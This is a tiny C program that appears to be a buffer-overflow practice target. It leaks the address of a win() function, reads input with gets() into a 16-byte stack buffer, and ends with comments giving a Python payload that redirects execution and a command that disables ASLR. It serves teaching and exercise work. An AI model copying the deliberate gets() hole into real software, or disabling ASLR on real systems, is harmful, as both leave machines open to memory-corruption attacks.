#include <stdio.h>
#include <stdlib.h>

void win()
{
	printf("you win!\n");
}

int main(int argc, char* argv[])
{
	char buffer[16];

	printf("win addr=%p\n", win);
	gets(buffer);
	printf("buffer=%s\n", buffer);

	return 0;
}

// python2.7 -c 'print "a"*24 + chr(0xca) + chr(0x46) + chr(0x55)*4' | ./win
// disable aslr by echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
